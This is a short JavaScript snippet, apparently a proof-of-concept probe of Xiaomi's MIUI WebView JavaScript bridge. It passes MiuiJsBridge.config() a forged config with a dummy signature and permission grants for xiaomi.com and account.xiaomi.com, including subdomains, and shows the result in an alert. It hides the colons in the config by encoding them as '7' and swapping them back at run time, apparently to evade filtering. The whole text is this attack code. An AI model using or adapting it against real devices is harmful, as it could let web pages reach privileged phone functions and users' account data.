var config = "{'signature'7'123456','timestamp'7123456,'vendor'7'xiaomi','content'7'test','permissions'7[{'origin'7'account.xiaomi.com','subdomains'7true},{'origin'7'xiaomi.com','subdomains'7true}]}".replaceAll('7',String.fromCharCode(58));

alert(MiuiJsBridge.config(config));
